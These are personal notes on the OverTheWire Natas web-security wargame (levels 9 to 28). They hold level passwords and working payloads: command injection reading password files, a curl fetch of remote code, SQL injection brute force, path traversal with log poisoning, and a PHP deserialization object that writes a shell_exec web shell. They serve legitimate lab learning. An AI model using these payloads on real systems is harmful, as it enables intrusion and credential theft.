# natas
natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj

check /files
check /robots.txt

manipulate http headers: referrer and cookie

* PHP code is ran on the webserver and you only see what the application wants you to see

on php: you might be able to find the secret in the path :`somethig.com/includes/secret.inc`
`
 <?
 include "includes/secret.inc";
 ?>
`

might be able to modify these: `?page=home` and path traversal too.

php: looking for variable `needle` in the request, assigning it to key.
`
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
`

# comand injection:

http://natas9.natas.labs.overthewire.org/?needle=secret`;cat%20/etc/natas_webpass/natas10%20`&submit=Search
grep searches multiple files: `grep -i a /etc/natas_webpass/natas11 another_file`

---

we can also do this, if some of the stuff are filtered:

we can try to load the code to be injected from an external resource by passing as value of needle parameter the following string

`$(curl -s http://www.example.com/code_to_inject.txt)`

where code_to_inject.txt could contain something like

`Africans" dictionary.txt ; cat /etc/natas_webpass/natas17 ; grep -i "Africans`

---

or to bruteforce it:

Africans, if found; XAfricans isn't, so:

`$(grep -E ^<token>.* /etc/natas_webpass/natas17)Africans`

if a character/sequence is a match, it won't find it in the database when
appended to Africans.

# xor encryption: 

A ⊕  0 = A
A ⊕  A  = 0

so:
    plaintext ⊕  key = ciphertext
    plaintext ⊕  ciphertext = key

if this is the key you get out of the equation:
``eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe@Rk`@Roe`` the actual key is `eDWo`.

^ is the bitwise XOR operator in PHP

fun curl command: `curl -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -b data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5 http://natas11.natas.labs.overthewire.org`

you can change the file extensions in post request, using curl or maybe burp.
upload using curl: `curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas12.natas.labs.overthewire.org`

to turn a file into a JPEG: `echo -e "\xFF\xD8\xFF\xE0" > image.php`

# sqli:

`curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 "http://natas14.natas.labs.overthewire.org/?debug&username=alice&password=s3cr3t"`
enable debugging mode to see how things are working.

---

`$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";`

if the username = `natas16" AND password LIKE BINARY "%<CHAR>%" "`:

`LIKE BINARY` operator in SQL is used to perform case-sensitive pattern matching in string comparisons.
so if the response contains something, the character is part of a password.

# bruteforce:

first, use every possible character, to check which of them could be in the
password. then we bruteforce the actual password, character by character.

# natas20

*session fixation attacks* attempt to exploit the vulnerability of a system
that allows one person to fixate (find or set) another person's session
identifier.

## PHP

`session_set_save_handler()` is a session-related function that sets
user-level session storage functions.

`session_start()` starts or resumes an existing session.

`$sid`: randomly assigned session ID

`strspn($sid, {some chracters})` returns stuff in sid that exist in `some chracters`.

`ksort($_SESSION)` sorts the keys in ascending order

`foreach(explode("\n", $data) as $line) {
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
}`

explode, separates each line in the `$data` and then separates them again with space as delimiter, into an array of `$parts = ["name", "test"];`

if we have `part[0]`, then add it to the `_session` like: `$_SESSION[$parts[0]] = $parts[1];`

Using `?debug` in the url gives us some info: `name|s:4:"test"` (test was
entered as name) part looks like a classic PHP object encoding vulnerability.

exploit:

The program does add a new line in for us in the mywrite() function, which partially explains why the myread() function reads lines in using the new line character as the end of the line

our goal is `$_SESSION["admin"] = 1`, our string will look like: `test\nadmin 1`

# natas21 cross-subdomain session cookies

``
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
``

here we can have our keys written to `$_SESSION`, there isn't any sanitization.

XSS didn't work, I injected the payload, it returned fine(key value pair), but didn't work:
`align=center%0A[admin]=>1`
Array
(
    [debug] =>
    [align] => center
 [admin] => 1
    [fontsize] => 100%
    [bgcolor] => yellow
    [submit] => Update
)

but adding it like this to the request worked: `align=center&admin=1&fontsize=100%25&bgcolor=yellow&submit=Update`

then because these two apps have the same PHPSESSID, since the session data for
both websites have to be on the same server, we can copy it from here to nata21.

# natas22 hidden redirection

If the revelio array key exists, and if the `$_SESSION` variable doesn’t include
admin=1, then we get redirected to location / which is the original index.php
page.

but the flag is in the redirection response if you intercept it with burp.

it’s not enough to redirect people away from sensitive information if they can
intercept requests and view that information before the redirect happens.

# natas23

test stuff in `repl` shell using `php -a`.

`strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 ))`

`strstr`, returns true if the string contains "iloveyou"
second one: will be true if it starts with something greater than 10.

# natas24

`
if(array_key_exists("passwd",$_REQUEST)){
    if(!strcmp($_REQUEST["passwd"],"<censored>")){
        echo "<br>The credentials for the next level are:<br>";
        echo "<pre>Username: natas25 Password: <censored></pre>";
    }
    else{
        echo "<br>Wrong!<br>";
    }
}
`

The strcmp() function will:

    Return < 0 if string1 is less than string2
    Return > 0 if string1 is greater than string2
    Return 0 if equal

If we were able to get any feedback from the strcmp() function, it might be
possible to brute force the password by using the negative or positive feedback

bypass the check entirely by getting the $password value to equal NULL, which
in PHP is equal to 0. The way they do this is by setting $password equal not to
a string but to an array

payload: `/?passwd[]=test`

# natal 25

path traversal:
`
function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) {
            include($filename);
            return 1;
        }
        return 0;
}
`

these are the filter:

to bypass `../` check, we should input `....//`.

`function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>`

so there is a log system somewhere.
`http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_28kiqm52cu4jsgeea6chdtb8g5.log`
and we appended `28kiqm52cu4jsgeea6chdtb8g5`, which is our `PHPSESSID`.

another thing we could do is to inject a code into the log file load the log
file then, load the logfile as a language using directory traversal.

test code to inject:
`User-Agent: <?php global $_MSG; $_MSG='oh damn!'; ?>`

`User-Agent: <?php global $_FOOTER; $_FOOTER=file_get_contents('/etc/natas_webpass/natas26'); ?>`
`<?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>`

to get the password

# natas 26

it's a *deserialization* vulnerability.

reading the source code; there is:

```php
array_key_exists("x1", $_GET)
```

which indicates that it supports `POST` requests.

```php
$drawing=unserialize(base64_decode($_COOKIE["drawing"]));
```

this is the vulnerable part of the code.

when an object is deserialized a `__wakeup()` and `__destruct()` methods will be called if existed.

there should be a class defined before the `unserialize()` function call.
then we can modify the object to send the flag where we can access.

in the case of this lab, we want to write to an accessible file using the `exitMsg` variable.

HOW to write our own object that does what we want?

we should create a class like this:

```php
<?php

class Logger{
    private $logFile;
    private $exitMsg;

    function __construct(){
        $this->exitMsg= "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "/var/www/natas/natas26/img/natas26_q82optt5977ar7gsc8bthe0123.php";
    }
}

$logger = new Logger();
echo base64_encode(serialize($logger));
```

we have to use absolute path and the `.php` at the ending makes it executable.
then we put it into the drawing cookie and voila.

the class name in the payload must match exactly the class name in the application’s code.

# 27

`trim()` in php clears the whitespaces.

`mysql_real_escape_string()` escapes the input and it will be hard if not impossible to do
SQL injection, though you could check for bypasses.

the only remaining thing to check for this level is the logic flaw.


another issue could be related to whether the SQL "strict mode" is enable or not

there are two points in this:

```sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
```

usernames don't have to be unique

Something related to it's length: if disabled, the value assigned to `VARCHAR` column could
exceed the columns length and causes an error.

if the username doesn't exist, it will check if there is any whitspace, if not, it will go
on and create a username.

the plan is to pass a long password that would get out of the variable space,  (`natas28
x`). So we will have a username that starts with `natas28` and contains many whitespaces in
our db.

`$user=mysqli_real_escape_string($link, substr($usr, 0, 64));`

to get the credentials for `natas28`, we should login using our own credentials with the
total of 64 characters then in the process of getting the data the spaces will be trimmed
and will be mistaken by the actual user.

```php
$user=mysqli_real_escape_string($link, trim($usr));
```

# natas28

```http
GET /search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIQ9i1qWcR+wgATYlCscOxBZIaVSupG+5Ppq4WEW09L0Nf/K3JUU/wpRwHlH118D44= HTTP/1.1
...
Authorization: Basic bmF0YXMyODoxSk53UU0xT2k2SjZqMWs0OVh5dzdaTjZwWE1RSW5Wag==
...
```

the query is urlencoded:
`G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIQ9i1qWcR+wgATYlCscOxBZIaVSupG+5Ppq4WEW09L0Nf/K3JUU/wpRwHlH118D44=`

the authorization is based64 encoded: `natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj`

`Whack Computer Joke Database` so it is a database.

Removing couple of characters from the query: `Zero padding found instead of PKCS#7 padding`

given the PKCS#7 error and repeating info, it’s more likely an ECB (electronic code book) cipher mode

This mode is insecure for most applications, because there’s no chaining between blocks, or other dependencies between blocks. Instead, each block of plaintext will be encoding with the key, meaning that every identical plaintext block will result in the same ciphertext block output. In cryptographic terms, this is known as lack of diffusion: the method of encryption does not hide data patterns well.
